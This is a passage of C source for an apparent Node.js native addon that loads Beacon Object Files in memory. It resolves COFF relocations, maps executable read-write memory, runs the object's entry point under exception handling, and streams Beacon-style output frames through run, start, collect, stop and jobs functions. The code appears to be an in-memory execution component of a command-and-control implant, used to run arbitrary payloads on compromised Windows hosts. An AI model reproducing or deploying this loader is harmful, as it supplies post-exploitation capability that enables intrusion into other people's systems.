                }
                mapFunctions[mapFunctionsSize] = procAddress;
                procAddress = &mapFunctions[mapFunctionsSize];
                mapFunctionsSize++;
            }
            else {
                BeaconOutput(BOF_ERROR_SYMBOL, "Undefined symbol", 17);
                status = FALSE;
                break;
            }

            if (reloc->Type == 1 /*IMAGE_REL_AMD64_ADDR64*/) {
                memcpy(&bigOffset, mapSections[sectionIndex] + reloc->VirtualAddress, sizeof(bigOffset));
                bigOffset += (long long)procAddress;
                memcpy(mapSections[sectionIndex] + reloc->VirtualAddress, &bigOffset, sizeof(bigOffset));
            }
            else if (reloc->Type == 3 /*IMAGE_REL_AMD64_ADDR32NB*/) {
                if (sym->SectionNumber <= 0 || sym->SectionNumber > MAX_SECTIONS)
                    return FALSE; // guarded: C++ indexes mapSections[-1] here
                memcpy(&offset, mapSections[sectionIndex] + reloc->VirtualAddress, sizeof(int));
                if (((char*)(mapSections[sym->SectionNumber - 1] + offset) -
                     (char*)(mapSections[sectionIndex] + reloc->VirtualAddress + 4)) > 0xffffffff)
                    return FALSE;
                offset = (int)(((char*)(mapSections[sym->SectionNumber - 1] + offset) -
                     (char*)(mapSections[sectionIndex] + reloc->VirtualAddress + 4)));
                offset += sym->Value;
                memcpy(mapSections[sectionIndex] + reloc->VirtualAddress, &offset, sizeof(int));
            }
            else if (reloc->Type >= 4 && reloc->Type <= 9 /*REL32..REL32_5*/) {
                int typeIndex = reloc->Type - 4;
                memcpy(&offset, mapSections[sectionIndex] + reloc->VirtualAddress, sizeof(int));
                long long disp = (long long)procAddress -
                    ((long long)(mapSections[sectionIndex] + reloc->VirtualAddress + 4 + typeIndex));
                if (disp > (long long)UINT_MAX || disp < -(long long)UINT_MAX)
                    return FALSE;
                offset += (int)disp;
                memcpy(mapSections[sectionIndex] + reloc->VirtualAddress, &offset, sizeof(int));
            }
        }
    }
    (void)taskId;
    return status;
}

static void ExecuteProc(const char* entryFuncName, char* args, int argsSize,
                        COF_SYMBOL* pSymbolTable, COF_HEADER* pHeader, char** mapSections) {
    for (int i = 0; i < pHeader->NumberOfSymbols; i++) {
        if (strcmp(pSymbolTable[i].Name.cName, entryFuncName) == 0) {
            if (pSymbolTable[i].SectionNumber <= 0) break;
            void(*proc)(char*, unsigned long) =
                (void(*)(char*, unsigned long))(mapSections[pSymbolTable[i].SectionNumber - 1] + pSymbolTable[i].Value);
            __try {
                proc(args, (unsigned long)argsSize);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                char msg[128];
                int n = _snprintf(msg, sizeof(msg), "BOF crashed (SEH exception 0x%08lX)",
                                  GetExceptionCode());
                if (n > 0) EmitFrame(tls_job ? tls_job->taskId : 0, CALLBACK_ERROR, msg, (unsigned int)n);
            }
            return;
        }
    }
    BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
}

// AsyncBofThreadProc port. The JS caller already sent the "started" ack.
static DWORD WINAPI BofJobThreadProc(LPVOID param) {
    BofJob* job = (BofJob*)param;
    tls_job = job;
    // PENDING -> RUNNING only; if a stop landed before we started, exit now
    if (InterlockedCompareExchange(&job->state, JOB_STATE_RUNNING, JOB_STATE_PENDING) != JOB_STATE_PENDING) {
        EmitFinal(job->taskId);
        tls_job = NULL;
        return 0;
    }

    COF_HEADER* pHeader = (COF_HEADER*)job->coffFile;
    char* mapSections[MAX_SECTIONS] = { 0 };
    void** mapFunctions = NULL;

    if (job->coffSize < sizeof(COF_HEADER) ||
        (unsigned short)pHeader->Machine != 0x8664 ||
        pHeader->NumberOfSections <= 0 || pHeader->NumberOfSections > MAX_SECTIONS ||
        pHeader->PointerToSymbolTable <= 0 || pHeader->PointerToSymbolTable >= (int)job->coffSize) {
        BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
        goto FINISH;
    }

    COF_SYMBOL* pSymbolTable = (COF_SYMBOL*)(job->coffFile + pHeader->PointerToSymbolTable);

    if (!AllocateSections(job->coffFile, pHeader, mapSections)) {
        BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
        goto FINISH;
    }

    mapFunctions = (void**)VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE,
        MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
    if (!mapFunctions) {
        BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
        goto FINISH;
    }

    if (!ProcessRelocations(job->coffFile, pHeader, mapSections, pSymbolTable, mapFunctions, job->taskId))
        goto FINISH;

    if (!job->args) { job->args = (unsigned char*)g_empty; job->argsSize = 0; }
    ExecuteProc(job->entry, (char*)job->args, job->argsSize, pSymbolTable, pHeader, mapSections);

FINISH:
    if (mapFunctions) VirtualFree(mapFunctions, 0, MEM_RELEASE);
    if (!job->abandoned) CleanupSections(mapSections);
    EmitFinal(job->taskId); // [taskId][50][u8 0] — "BOF finished"
    tls_job = NULL;
    InterlockedExchange(&job->state, JOB_STATE_FINISHED);
    return 0;
}

// ---- napi glue ------------------------------------------------------------------
static int g_jobs_register(BofJob* job) {
    int slot = -1;
    EnterCriticalSection(&g_jobsLock);
    for (int i = 0; i < MAX_JOBS; i++) {
        if (!g_jobs[i]) { g_jobs[i] = job; slot = i; break; }
    }
    LeaveCriticalSection(&g_jobsLock);
    return slot;
}

static void g_jobs_prune_finished(void) {
    // remove FINISHED/STOPPED jobs whose frame queues are fully drained
    // (like CleanupFinishedBofs — after ProcessAsyncBofs flushed them)
    EnterCriticalSection(&g_jobsLock);
    for (int i = 0; i < MAX_JOBS; i++) {
        BofJob* job = g_jobs[i];
        if (!job) continue;
        LONG st = job->state;
        if (st == JOB_STATE_FINISHED || st == JOB_STATE_STOPPED) {
            EnterCriticalSection(&job->lock);
            int drained = (job->frames.count == 0);
            LeaveCriticalSection(&job->lock);
            if (drained) {
                g_jobs[i] = NULL;
                LeaveCriticalSection(&g_jobsLock);
                job_free(job);
                EnterCriticalSection(&g_jobsLock);
            }
        }
    }
    LeaveCriticalSection(&g_jobsLock);
}

typedef struct { unsigned char** bufs; unsigned int* lens; int count, cap; } FrameDrain;

static void drain_push(FrameDrain* d, const unsigned char* data, unsigned int len) {
    if (d->count == d->cap) {
        d->cap = d->cap ? d->cap * 2 : 16;
        d->bufs = (unsigned char**)realloc(d->bufs, d->cap * sizeof(void*));
        d->lens = (unsigned int*)realloc(d->lens, d->cap * sizeof(unsigned int));
    }
    unsigned char* b = (unsigned char*)malloc(len ? len : 1);
    memcpy(b, data, len);
    d->bufs[d->count] = b; d->lens[d->count] = len; d->count++;
}

static napi_value frames_to_js(napi_env env, FrameDrain* d) {
    napi_value result;
    napi_create_array(env, &result);
    for (int i = 0; i < d->count; i++) {
        napi_value buf;
        napi_create_buffer_copy(env, d->lens[i], d->bufs[i], NULL, &buf);
        napi_set_element(env, result, (uint32_t)i, buf);
        free(d->bufs[i]);
    }
    free(d->bufs); free(d->lens);
    d->bufs = NULL; d->lens = NULL; d->count = d->cap = 0;
    return result;
}

// parse common args: taskId, entry, coff, args [, timeoutMs]
static int parse_run_args(napi_env env, napi_callback_info info,
                          double* taskId, char* entry, size_t entryCap,
                          unsigned char** coff, size_t* coffLen,
                          unsigned char** args, size_t* argsLen,
                          double* timeoutMs) {
    size_t argc = 5;
    napi_value argv[5];
    if (!napi_resolve()) return -2; // host exe has no napi surface
    napi_get_cb_info(env, info, &argc, argv, NULL, NULL);
    if (argc < 4) return -1;
    napi_get_value_double(env, argv[0], taskId);
    napi_get_value_string_utf8(env, argv[1], entry, entryCap, NULL);
    napi_get_buffer_info(env, argv[2], (void**)coff, coffLen);
    napi_get_buffer_info(env, argv[3], (void**)args, argsLen);
    *timeoutMs = 0;
    if (argc >= 5) napi_get_value_double(env, argv[4], timeoutMs);
    return 0;
}

// run(): sync with timeout — thread + wait + drain (hang-proof, c0rnbread model)
static napi_value Run(const napi_env env, const napi_callback_info info) {
    double taskIdD; char entry[64];
    unsigned char *coff, *args; size_t coffLen, argsLen; double timeoutMs;
    if (parse_run_args(env, info, &taskIdD, entry, sizeof(entry), &coff, &coffLen, &args, &argsLen, &timeoutMs) != 0) {
        napi_throw_type_error(env, NULL, "run(taskId, entry, coff, args [, timeoutMs])");
        return NULL;
    }

    BofJob* job = job_new((unsigned int)taskIdD, entry, coff, (unsigned int)coffLen,
                          args, (int)argsLen, (ULONGLONG)timeoutMs);
    if (!job) { napi_throw_error(env, NULL, "job alloc failed"); return NULL; }

    DWORD tid = 0;
    job->hThread = CreateThread(NULL, 0, BofJobThreadProc, job, 0, &tid);
    if (!job->hThread) { job_free(job); napi_throw_error(env, NULL, "CreateThread failed"); return NULL; }

    DWORD wait = WaitForSingleObject(job->hThread, timeoutMs > 0 ? (DWORD)timeoutMs : INFINITE);
    if (wait == WAIT_TIMEOUT) {
        char msg[80];
        int n = _snprintf(msg, sizeof(msg), "BOF exceeded execution timeout - stopped");
        if (n > 0) EmitFrame(job->taskId, CALLBACK_ERROR, msg, (unsigned int)n);
        job_stop(job);
    }

    FrameDrain d = { 0 };
    // thread frames
    for (int i = 0; i < job->frames.count; i++) drain_push(&d, job->frames.bufs[i], job->frames.lens[i]);
    outlist_reset(&job->frames);
    // legacy fallback (frames emitted outside a job — e.g. timeout message)
    for (int i = 0; i < g_fallback.count; i++) drain_push(&d, g_fallback.bufs[i], g_fallback.lens[i]);
    outlist_reset(&g_fallback);

    job_free(job);
    return frames_to_js(env, &d);
}

// start(): async — returns true if the job launched
static napi_value Start(const napi_env env, const napi_callback_info info) {
    double taskIdD; char entry[64];
    unsigned char *coff, *args; size_t coffLen, argsLen; double timeoutMs;
    if (parse_run_args(env, info, &taskIdD, entry, sizeof(entry), &coff, &coffLen, &args, &argsLen, &timeoutMs) != 0) {
        napi_throw_type_error(env, NULL, "start(taskId, entry, coff, args [, timeoutMs])");
        return NULL;
    }

    BofJob* job = job_new((unsigned int)taskIdD, entry, coff, (unsigned int)coffLen,
                          args, (int)argsLen, (ULONGLONG)timeoutMs);
    if (!job) { napi_value f; napi_get_boolean(env, false, &f); return f; }

    if (g_jobs_register(job) < 0) { job_free(job); napi_value f; napi_get_boolean(env, false, &f); return f; }

    DWORD tid = 0;
    job->hThread = CreateThread(NULL, 0, BofJobThreadProc, job, 0, &tid);
    if (!job->hThread) {
        EnterCriticalSection(&g_jobsLock);
        for (int i = 0; i < MAX_JOBS; i++) if (g_jobs[i] == job) { g_jobs[i] = NULL; break; }
        LeaveCriticalSection(&g_jobsLock);
        job_free(job);
        napi_value f; napi_get_boolean(env, false, &f); return f;
    }
    napi_value t; napi_get_boolean(env, true, &t); return t;
}

// collect(): drain frames from all live jobs; enforce deadlines; prune finished
static napi_value Collect(const napi_env env, const napi_callback_info info) {
    if (!napi_resolve()) return NULL;
    FrameDrain d = { 0 };

    EnterCriticalSection(&g_jobsLock);
    BofJob* snapshot[MAX_JOBS];
    int n = 0;
    for (int i = 0; i < MAX_JOBS; i++) if (g_jobs[i]) snapshot[n++] = g_jobs[i];
    LeaveCriticalSection(&g_jobsLock);

    for (int i = 0; i < n; i++) {
        BofJob* job = snapshot[i];
        job_enforce_deadline(job);          // may stop/terminate + queue error frame
        EnterCriticalSection(&job->lock);
        for (int k = 0; k < job->frames.count; k++)
            drain_push(&d, job->frames.bufs[k], job->frames.lens[k]);
        outlist_reset(&job->frames);
        LeaveCriticalSection(&job->lock);
    }

    g_jobs_prune_finished();
    return frames_to_js(env, &d);
}

// stop(jobId): StopAsyncBof port — signals/terminates and marks STOPPED.
// The job stays registered until collect()'s pruner drains its remaining
// frames (error + final) and frees it — keeps Stop() race-free vs snapshots.
static napi_value Stop(const napi_env env, const napi_callback_info info) {
    if (!napi_resolve()) return NULL;
    size_t argc = 1; napi_value argv[1];
    napi_get_cb_info(env, info, &argc, argv, NULL, NULL);
    double jobIdD = 0;
    if (argc >= 1) napi_get_value_double(env, argv[0], &jobIdD);
    unsigned int jobId = (unsigned int)jobIdD;

    napi_value found = NULL;
    napi_get_boolean(env, false, &found);
    EnterCriticalSection(&g_jobsLock);
    for (int i = 0; i < MAX_JOBS; i++) {
        if (g_jobs[i] && g_jobs[i]->taskId == jobId) {
            BofJob* job = g_jobs[i];
            LeaveCriticalSection(&g_jobsLock);
            job_stop(job);
            napi_get_boolean(env, true, &found);
            return found;
        }
    }
    LeaveCriticalSection(&g_jobsLock);
    return found;
}

// jobs(): taskIds of live async jobs (JOBS_LIST parity — STOPPED excluded)
static napi_value Jobs(const napi_env env, const napi_callback_info info) {
    if (!napi_resolve()) return NULL;
    napi_value result;
    napi_create_array(env, &result);
    int k = 0;
    EnterCriticalSection(&g_jobsLock);
    for (int i = 0; i < MAX_JOBS; i++) {
        if (g_jobs[i] && g_jobs[i]->state != JOB_STATE_STOPPED) {
            napi_value v;
            napi_create_uint32(env, g_jobs[i]->taskId, &v);
            napi_set_element(env, result, (uint32_t)k++, v);
        }
    }
    LeaveCriticalSection(&g_jobsLock);
    return result;
}

static napi_value Init(napi_env env, napi_value exports) {
    if (!napi_resolve()) return exports; // unresolved: exports stay empty
    if (!g_jobsInit) {
        InitializeCriticalSection(&g_jobsLock);
        InitializeCriticalSection(&g_kvLock);
        unsigned __int64 c = (unsigned __int64)GetTickCount64() ^ 0x2B992DDFA232ull;
        c |= 1; // MSVC cookies are always odd
        g_security_cookie = c;
        g_jobsInit = 1;
    }
    napi_value fn;
    napi_create_function(env, NULL, 0, Run, NULL, &fn);
    napi_set_named_property(env, exports, "run", fn);
    napi_create_function(env, NULL, 0, Start, NULL, &fn);
    napi_set_named_property(env, exports, "start", fn);
    napi_create_function(env, NULL, 0, Collect, NULL, &fn);
    napi_set_named_property(env, exports, "collect", fn);
    napi_create_function(env, NULL, 0, Stop, NULL, &fn);
    napi_set_named_property(env, exports, "stop", fn);
    napi_create_function(env, NULL, 0, Jobs, NULL, &fn);
    napi_set_named_property(env, exports, "jobs", fn);
    return exports;
}

NAPI_MODULE(NODE_GYP_MODULE_NAME, Init)
